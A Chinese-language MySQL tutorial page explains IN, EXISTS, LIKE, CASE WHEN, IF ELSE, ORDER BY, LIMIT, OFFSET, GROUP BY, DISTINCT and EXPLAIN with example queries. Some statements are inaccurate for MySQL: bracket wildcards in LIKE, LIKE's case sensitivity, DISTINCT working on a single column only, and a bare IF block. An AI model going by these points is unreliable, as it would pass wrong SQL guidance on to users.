<h2 id="IN"><a href="#IN" class="headerlink" title="IN"></a>IN</h2><p>在MySQL中，<code>IN</code>是一个逻辑运算符，它允许你在<code>WHERE</code>或<code>HAVING</code>子句中指定多个值。以下是其基本语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column1, column2, ...<br><span class="hljs-keyword">FROM</span> table_name<br><span class="hljs-keyword">WHERE</span> column_name <span class="hljs-keyword">IN</span> (value1, value2, ...);<br></code></pre></td></tr></table></figure>

<p>在这个语句中，<code>column1</code>, <code>column2</code>, … 是你想从表中选择的列的名称，<code>table_name</code>是你想从中选择数据的表的名称，<code>column_name</code>是你想要应用条件的列的名称，<code>value1</code>, <code>value2</code>, … 是你想在列中查找的值。</p>
<p>例如，如果你想从<code>students</code>表中选择名字为’John Doe’或’Jane Doe’的学生，你可以这样做：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">WHERE</span> name <span class="hljs-keyword">IN</span> (<span class="hljs-string">&#x27;John Doe&#x27;</span>, <span class="hljs-string">&#x27;Jane Doe&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p><code>IN</code>运算符等价于多个<code>OR</code>条件。上面的查询等价于以下查询：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">WHERE</span> name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;John Doe&#x27;</span> <span class="hljs-keyword">OR</span> name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Jane Doe&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>你还可以在<code>IN</code>子句中使用子查询来动态生成值的列表。例如，以下查询会选择所有在<code>courses</code>表中有记录的学生：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">WHERE</span> id <span class="hljs-keyword">IN</span> (<span class="hljs-keyword">SELECT</span> student_id <span class="hljs-keyword">FROM</span> courses);<br></code></pre></td></tr></table></figure>

<p>在这个例子中，子查询<code>SELECT student_id FROM courses</code>会返回所有在<code>courses</code>表中有记录的学生的ID，然后主查询会从<code>students</code>表中选择这些ID对应的学生。</p>
<p>“&#x3D;”不能代替IN，因为“&#x3D;”在返回结果多于一条的时候会报错，“Subquery returns more than 1 row”。</p>
<h2 id="EXISTS"><a href="#EXISTS" class="headerlink" title="EXISTS"></a>EXISTS</h2><p>在MySQL中，<code>EXISTS</code>是一个条件运算符，用于检查一个子查询是否返回了任何行。它通常与<code>SELECT</code>语句的<code>WHERE</code>子句一起使用。</p>
<p>以下是<code>EXISTS</code>的基本语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column1, column2, ...<br><span class="hljs-keyword">FROM</span> table_name<br><span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">EXISTS</span> (subquery);<br></code></pre></td></tr></table></figure>

<p>在这里，<code>column1</code>, <code>column2</code>, … 是你想要从表中选择的列的名称，<code>table_name</code> 是你想要查询的表的名称，<code>subquery</code> 是一个子查询，它可以是一个完整的<code>SELECT</code>语句。</p>
<p>以下是一个例子：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name<br><span class="hljs-keyword">FROM</span> students<br><span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">EXISTS</span> (<br>    <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span><br>    <span class="hljs-keyword">FROM</span> courses<br>    <span class="hljs-keyword">WHERE</span> courses.student_id <span class="hljs-operator">=</span> students.id<br>);<br></code></pre></td></tr></table></figure>

<p>这个查询将返回在<code>students</code>表中存在对应课程的学生的姓名。子查询检查是否存在与<code>students</code>表中的学生关联的记录在<code>courses</code>表中。</p>
<p><code>EXISTS</code>运算符返回布尔值（<code>TRUE</code>或<code>FALSE</code>），如果子查询返回至少一行，则为<code>TRUE</code>，否则为<code>FALSE</code>。它通常用于<code>WHERE</code>子句中作为一个条件来过滤查询结果。</p>
<p>请注意，<code>EXISTS</code>子查询可以是任意复杂的查询，它可以包含聚合函数、子查询、连接等。在使用<code>EXISTS</code>时，关联子查询通常使用相关列来建立条件，以与外部查询进行关联。</p>
<h2 id="LIKE"><a href="#LIKE" class="headerlink" title="LIKE"></a>LIKE</h2><p>在MySQL中，<code>LIKE</code>是一个用于模式匹配的操作符，通常用于<code>WHERE</code>子句中以过滤符合特定模式的数据。</p>
<p>以下是<code>LIKE</code>的基本语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column1, column2, ...<br><span class="hljs-keyword">FROM</span> table_name<br><span class="hljs-keyword">WHERE</span> column_name <span class="hljs-keyword">LIKE</span> <span class="hljs-keyword">pattern</span>;<br></code></pre></td></tr></table></figure>

<p>在这里，<code>column1</code>, <code>column2</code>, … 是你想要从表中选择的列的名称，<code>table_name</code> 是你想要查询的表的名称，<code>column_name</code> 是你想要应用模式匹配的列的名称，<code>pattern</code> 是匹配模式。</p>
<p><code>LIKE</code>操作符使用通配符来匹配模式，常用的通配符有：</p>
<ul>
<li><code>%</code>：匹配任意字符（包括零个字符）。</li>
<li><code>_</code>：匹配任意单个字符。</li>
<li><code>[characters]</code>：匹配指定字符集中的任意单个字符。</li>
<li><code>[^characters]</code>：匹配不在指定字符集中的任意单个字符。</li>
</ul>
<p>以下是一些使用<code>LIKE</code>的例子：</p>
<ol>
<li><p><strong>以特定字符开头的匹配：</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">WHERE</span> name <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;J%&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p> 这个查询将返回名字以字母 ‘J’ 开头的所有学生记录。</p>
</li>
<li><p><strong>以特定字符结尾的匹配：</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">WHERE</span> email <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%example.com&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p> 这个查询将返回邮箱以 ‘@example.com’ 结尾的所有学生记录。</p>
</li>
<li><p><strong>包含特定字符的匹配：</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">WHERE</span> name <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%Doe%&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p> 这个查询将返回名字中包含 ‘Doe’ 的所有学生记录。</p>
</li>
<li><p><strong>指定单个字符的匹配：</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">WHERE</span> name <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;_ohn&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p> 这个查询将返回名字为四个字符并以 ‘ohn’ 结尾的所有学生记录，其中第二个字符可以是任意字符。</p>
</li>
</ol>
<p>请注意，<code>LIKE</code>匹配区分大小写，如果需要不区分大小写的匹配，可以使用<code>COLLATE</code>关键字指定不区分大小写的字符集，如 <code>WHERE column_name COLLATE utf8_general_ci LIKE pattern;</code>。</p>
<h2 id="CASE-WHEN"><a href="#CASE-WHEN" class="headerlink" title="CASE WHEN"></a>CASE WHEN</h2><p>MySQL 的 CASE WHEN 是一种条件表达式，它类似于其他编程语言中的 switch 或 if-then-else 结构。它可以在 SELECT 语句中使用，根据一个或多个条件返回不同的值。</p>
<p>CASE WHEN 语法的基本结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CASE expression<br>WHEN value_1 THEN result_1<br>WHEN value_2 THEN result_2<br>...<br>ELSE default_result<br>END<br></code></pre></td></tr></table></figure>

<p>CASE 关键字后面的 expression 是要检查的值或表达式，value_x 是与 expression 进行比较的值，而 result_x 则是与 value_x 对应的结果。如果 expression 和某个 value_x 相匹配，则会返回对应的 result_x。如果都没有匹配，将会执行 ELSE 子句中指定的 default_result（可选的，如果没有 ELSE 子句，将返回 NULL）。</p>
<p>以下是一个简单的例子，演示了如何在 SELECT 语句中使用 CASE WHEN：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT employee_name, <br>CASE department_id<br>	WHEN 1 THEN &#x27;Sales&#x27;<br>    WHEN 2 THEN &#x27;Marketing&#x27;<br>    ELSE &#x27;Other&#x27;<br>END as department<br>FROM employees;<br></code></pre></td></tr></table></figure>

<p>这条语句查询了一个名为 employees 的表格，其中包含员工信息，包括姓名、部门编号等。它使用 CASE WHEN 结构来把部门编号转换为对应的文本描述，最终会返回每个员工的名称和所在部门的文本标签。</p>
<p>需要注意的是，CASE WHEN 也支持复杂的判断逻辑和多个条件，可以使用嵌套和逻辑运算符来实现复杂的条件判断。</p>
<p>以下是CASE WHEN的另一个例子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT id,<br>CASE<br>	WHEN sales &gt;= 100 THEN &#x27;高&#x27;<br>	WHEN sales &gt;= 50 THEN &#x27;中等&#x27;<br>    ELSE &#x27;低&#x27;<br>END AS &#x27;评价&#x27;<br>FROM tb;<br></code></pre></td></tr></table></figure>

<h2 id="IF-ELSE"><a href="#IF-ELSE" class="headerlink" title="IF ELSE"></a>IF ELSE</h2><p>在MySQL中，可以使用<code>IF</code>和<code>THEN</code>关键字来实现条件语句。基本语法如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">IF condition THEN<br>    statement(s);<br>ELSE<br>    statement(s);<br>END IF;<br></code></pre></td></tr></table></figure>

<p>其中，如果“condition”（条件）为真，则执行<code>THEN</code>子句中的一个或多个语句，否则执行<code>ELSE</code>子句中的一个或多个语句。ELSE&#96;块是可选的。</p>
<p>让我们看一个实际的例子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SET @score = 80;<br><br>IF @score &gt;= 60 THEN<br>    SELECT &#x27;Pass&#x27;;<br>ELSE<br>    SELECT &#x27;Fail&#x27;;<br>END IF;<br></code></pre></td></tr></table></figure>

<p>在上述示例中，将变量<code>@score</code>设置为80分。然后，使用<code>IF</code>语句检查是否及格（分数大于等于60）。如果成立，则输出“Pass”，否则输出“Fail”。</p>
<h2 id="ORDER-BY和ACS或DESC"><a href="#ORDER-BY和ACS或DESC" class="headerlink" title="ORDER BY和ACS或DESC"></a>ORDER BY和ACS或DESC</h2><p>在MySQL中，你可以使用<code>ORDER BY</code>子句对查询结果进行排序。<code>ORDER BY</code>子句可以指定按照一个或多个列进行升序（默认）或降序排序。</p>
<p>以下是<code>ORDER BY</code>子句的基本语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT column1, column2, ...<br>FROM table_name<br>ORDER BY column1 [ASC|DESC], column2 [ASC|DESC], ...;<br></code></pre></td></tr></table></figure>

<p>在这里，<code>column1</code>, <code>column2</code>, … 是你想要排序的列的名称，<code>ASC</code>表示升序（默认），<code>DESC</code>表示降序。</p>
<p>以下是一些例子：</p>
<ol>
<li><p><strong>按照单个列进行升序排序：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT * FROM students<br>ORDER BY name ASC;<br></code></pre></td></tr></table></figure>

<p> 这将按照<code>name</code>列的字母顺序对<code>students</code>表中的记录进行升序排序。</p>
</li>
<li><p><strong>按照单个列进行降序排序：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT * FROM students<br>ORDER BY age DESC;<br></code></pre></td></tr></table></figure>

<p> 这将按照<code>age</code>列的逆序（从高到低）对<code>students</code>表中的记录进行降序排序。</p>
</li>
<li><p><strong>按照多个列进行排序：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT * FROM students<br>ORDER BY age ASC, name ASC;<br></code></pre></td></tr></table></figure>

<p> 这将首先按照<code>age</code>列进行升序排序，然后对于具有相同<code>age</code>值的记录，按照<code>name</code>列的字母顺序进行升序排序。</p>
</li>
</ol>
<p>请注意，<code>ORDER BY</code>子句应该在<code>SELECT</code>语句的最后使用。如果你想在查询结果中以相反的顺序排序，只需在列名后使用<code>DESC</code>关键字。默认情况下，排序是升序的（ASC）。</p>
<p>ORDER BY可以实现对分组后的结果进行排序，MySQL语句中先写“GROUP BY”再写“ORDER BY”，示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT<br>	empid, AVG(sales)<br>FROM tb<br>	GROUP BY empid<br>ORDER BY AVG(sales)<br>	DESC;<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT empid, AVG(sales)<br>	FROM tb<br>GROUP BY empid<br>	HAVING AVG(sales) &gt; 50<br>ORDER BY AVG(sales)<br>	DESC;<br></code></pre></td></tr></table></figure>

<h2 id="LIMIT"><a href="#LIMIT" class="headerlink" title="LIMIT"></a>LIMIT</h2><p>在MySQL中，<code>LIMIT</code>用于限制查询结果的数量。它可以在<code>SELECT</code>语句中用于指定返回的行数。</p>
<p>以下是<code>LIMIT</code>的基本语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column1, column2, ...<br><span class="hljs-keyword">FROM</span> table_name<br>LIMIT number_of_rows;<br></code></pre></td></tr></table></figure>

<p>在这里，<code>column1</code>, <code>column2</code>, … 是你想要从表中选择的列的名称，<code>table_name</code> 是你想要查询的表的名称，<code>number_of_rows</code> 是你希望返回的行数。</p>
<p>以下是一些使用<code>LIMIT</code>的例子：</p>
<ol>
<li><p><strong>限制结果集的行数：</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> students LIMIT <span class="hljs-number">10</span>;<br></code></pre></td></tr></table></figure>

<p> 这个查询将返回 <code>students</code> 表中的前 10 行记录。</p>
</li>
<li><p><strong>指定起始位置和行数：</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> students LIMIT <span class="hljs-number">5</span>, <span class="hljs-number">10</span>;<br></code></pre></td></tr></table></figure>

<p> 这个查询将从 <code>students</code> 表中的第 6 行开始（偏移量为 5），返回后续的 10 行记录。这是通过使用两个参数来实现的，第一个参数是起始位置的偏移量，第二个参数是要返回的行数。</p>
</li>
</ol>
<p><code>LIMIT</code>语句还可以与<code>ORDER BY</code>子句一起使用，以在指定排序顺序的基础上限制结果集的行数。例如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> age <span class="hljs-keyword">DESC</span> LIMIT <span class="hljs-number">5</span>;<br></code></pre></td></tr></table></figure>

<p>这个查询将按照年龄降序排序，并返回年龄最大的前 5 条学生记录。</p>
<p>请注意，<code>LIMIT</code>子句在查询中的位置很重要，它通常出现在<code>SELECT</code>语句的末尾。</p>
<h2 id="OFFSET"><a href="#OFFSET" class="headerlink" title="OFFSET"></a>OFFSET</h2><p>在 MySQL 中，<code>OFFSET</code> 用于从查询结果的某个特定行开始返回数据。<code>OFFSET</code> 必须和 <code>LIMIT</code> 一起使用，以便明确指定要返回的行数和偏移量。</p>
<p><code>OFFSET</code> 的语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT column1, column2, ...<br>FROM table<br>WHERE condition<br>ORDER BY column1, column2, ...<br>LIMIT offset, count;<br></code></pre></td></tr></table></figure>

<p>另一种语法是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT column1, column2, ...<br>FROM table<br>WHERE condition<br>ORDER BY column1, column2, ...<br>LIMIT count OFFSET offset;<br></code></pre></td></tr></table></figure>

<p>其中，<code>offset</code> 是要偏移的行数，<code>count</code> 是要返回的行数。例如，如果希望跳过前 5 行并获取接下来的 10 行，可以这样写：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT *<br>FROM mytable<br>ORDER BY id<br>LIMIT 5, 10;<br></code></pre></td></tr></table></figure>

<p>或写为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT *<br>FROM mytable<br>ORDER BY id<br>LIMIT 10 OFFSET 5;<br></code></pre></td></tr></table></figure>

<p>这个查询将返回表中排序后的第 6 行到第 15 行，因为它跳过前 5 行（即偏移量为 5），然后返回接下来的 10 行。</p>
<p>需要注意的是，在处理大数据集时， OFFSET 可能会影响查询性能，因为它需要跳过指定数量的行，直到达到指定偏移量。为了避免此类问题，可以考虑优化查询或者通过其他手段减少数据集的大小。</p>
<h2 id="GROUP-BY"><a href="#GROUP-BY" class="headerlink" title="GROUP BY"></a>GROUP BY</h2><p>在MySQL中，<code>GROUP BY</code>子句用于将查询结果按照一个或多个列进行分组。它常与聚合函数（如<code>SUM</code>、<code>COUNT</code>、<code>AVG</code>等）一起使用，以对每个组应用聚合函数并生成汇总结果。</p>
<p>以下是<code>GROUP BY</code>的基本语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column1, column2, ..., aggregate_function(<span class="hljs-keyword">column</span>)<br><span class="hljs-keyword">FROM</span> table_name<br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> column1, column2, ...;<br></code></pre></td></tr></table></figure>

<p>在这里，<code>column1</code>, <code>column2</code>, … 是你想要从表中选择的列的名称，<code>table_name</code> 是你想要查询的表的名称，<code>aggregate_function</code> 是一个聚合函数（如 <code>SUM</code>, <code>COUNT</code>, <code>AVG</code> 等），<code>column</code> 是你想要按照其进行分组的列。</p>
<p>以下是一个例子：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> department, <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">as</span> total_students<br><span class="hljs-keyword">FROM</span> students<br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> department;<br></code></pre></td></tr></table></figure>

<p>这个查询将根据学生表中的<code>department</code>列对记录进行分组，并计算每个部门的学生人数。</p>
<p>请注意，<code>GROUP BY</code>子句通常与聚合函数一起使用。在<code>SELECT</code>语句中，你可以选择其他非聚合列，但这些列必须出现在<code>GROUP BY</code>子句中或作为聚合函数的参数。否则，将出现错误。</p>
<p>此外，你还可以在<code>GROUP BY</code>子句中使用多个列，以按照多个列进行分组。例如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> department, gender, <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">as</span> total_students<br><span class="hljs-keyword">FROM</span> students<br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> department, gender;<br></code></pre></td></tr></table></figure>

<p>这个查询将根据<code>department</code>和<code>gender</code>两个列对记录进行分组，并计算每个部门和性别的学生人数。</p>
<h2 id="DISTINCT"><a href="#DISTINCT" class="headerlink" title="DISTINCT"></a>DISTINCT</h2><p>MySQL中的<code>DISTINCT</code>关键字用于去重查询结果集。</p>
<p>例如，当我们需要查询某张表中的所有员工身份证号码时，可能会出现一些员工重复的情况。此时可以使用<code>DISTINCT</code>关键字来消除重复项，确保查询结果唯一：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT DISTINCT id_number FROM employee;<br></code></pre></td></tr></table></figure>

<p>上述语句将返回一张包含所有不重复身份证号码的数据表。</p>
<p>需要注意的是，<code>DISTINCT</code>操作是在内存中进行的，如果查询的结果集比较大，或者查询条件过多，可能会影响查询性能。同时，在使用<code>DISTINCT</code>关键字时，也要注意它适用于单个列的去重，若需要多列的去重，则需要使用<code>GROUP BY</code>语句来实现。</p>
<h2 id="EXPLAIN"><a href="#EXPLAIN" class="headerlink" title="EXPLAIN"></a>EXPLAIN</h2><p>在MySQL中，可以使用<code>EXPLAIN</code>关键字来分析SQL语句的执行计划，从而优化查询性能。</p>
<p><code>EXPLAIN</code>语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">EXPLAIN SELECT * FROM table_name WHERE condition;<br></code></pre></td></tr></table></figure>

<p><code>EXPLAIN</code>会返回一张表格，其中包含了关于MySQL如何处理SQL语句的信息，例如表的读取顺序、使用的索引名及类型、是否需要临时表等等。通过检查这些信息，可以找到潜在的性能问题，并针对性地进行调整。</p>
<p>常见的一些列含义：</p>
<ul>
<li>id: 执行SELECT查询的序列号，id相同表示执行相同的查询。</li>
<li>select_type: 查询类型，例如Simple表示最简单的查询类型，Derived表示一个派生表或子查询中的查询类型。</li>
<li>table: 指出MySQL将从哪个表或派生表读取行。 </li>
<li>partitions: 匹配的分区列表，如果没有分区则为NULL。</li>
<li>type: 显示表的连接类型，包括system, const, eq_ref, ref, range, index和ALL。一般来说，查询类型越复杂，性能越低。</li>
<li>possible_keys: 展示MySQL可能使用哪些索引来查找表中的行，是一个逗号分隔的索引列表。 </li>
<li>key: 表示实际将使用哪个索引，如果为NULL则说明没有找到合适的索引。</li>
<li>key_len: 表示MySQL用了索引的长度，如果key为NULL，则key_len也为NULL。</li>
<li>ref: 显示索引的哪一列被使用了，如果可能的话，可能是一个常数。 </li>
<li>rows: MySQL认为它执行查询时必须检查的行数，这个值是估计出来的，并不一定准确。 </li>
<li>filtered: 表示此表过滤器的百分比，即选择性的值。</li>
<li>Extra: 其他信息，通常提供有关查询策略的特殊说明。</li>
</ul>
<p>通过对<code>EXPLAIN</code>结果的分析，可以确定哪些操作需要优化，例如加上索引、优化查询条件等，从而提高查询性能。</p>
<h1 id="IN和EXIST的区别与联系"><a href="#IN和EXIST的区别与联系" class="headerlink" title="IN和EXIST的区别与联系"></a>IN和EXIST的区别与联系</h1><p>在MySQL中，<code>EXISTS</code>和<code>IN</code>是两个用于条件判断和子查询的关键字。</p>
<p><code>EXISTS</code>用于检查子查询是否返回任何行，它返回一个布尔值。如果子查询返回至少一行，<code>EXISTS</code>条件为真（true），否则为假（false）。</p>
<p><code>IN</code>用于判断一个值是否存在于子查询的结果集中，它也返回一个布尔值。如果值存在于子查询的结果集中，<code>IN</code>条件为真（true），否则为假（false）。</p>
<p>以下是使用<code>EXISTS</code>和<code>IN</code>的基本语法示例：</p>
<ol>
<li><p>使用<code>EXISTS</code>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column1, column2, ...<br><span class="hljs-keyword">FROM</span> table_name<br><span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">EXISTS</span> (subquery);<br></code></pre></td></tr></table></figure>
<p>例子：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name<br><span class="hljs-keyword">FROM</span> students<br><span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">EXISTS</span> (<br>    <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span><br>    <span class="hljs-keyword">FROM</span> courses<br>    <span class="hljs-keyword">WHERE</span> courses.student_id <span class="hljs-operator">=</span> students.id<br>);<br></code></pre></td></tr></table></figure>
</li>
<li><p>使用<code>IN</code>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column1, column2, ...<br><span class="hljs-keyword">FROM</span> table_name<br><span class="hljs-keyword">WHERE</span> column_name <span class="hljs-keyword">IN</span> (subquery);<br></code></pre></td></tr></table></figure>
<p>例子：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name<br><span class="hljs-keyword">FROM</span> students<br><span class="hljs-keyword">WHERE</span> id <span class="hljs-keyword">IN</span> (<br>    <span class="hljs-keyword">SELECT</span> student_id<br>    <span class="hljs-keyword">FROM</span> courses<br>);<br></code></pre></td></tr></table></figure></li>
</ol>
<p>需要注意的是，<code>EXISTS</code>通常用于检查子查询的存在性，而<code>IN</code>通常用于检查一个值是否存在于另一个查询结果集中。在某些情况下，<code>EXISTS</code>和<code>IN</code>可以互相替代，但根据具体情况选择合适的关键字会更有效。此外，<code>EXISTS</code>通常在子查询的结果集很大时具有更好的性能，而<code>IN</code>适用于较小的结果集。</p>
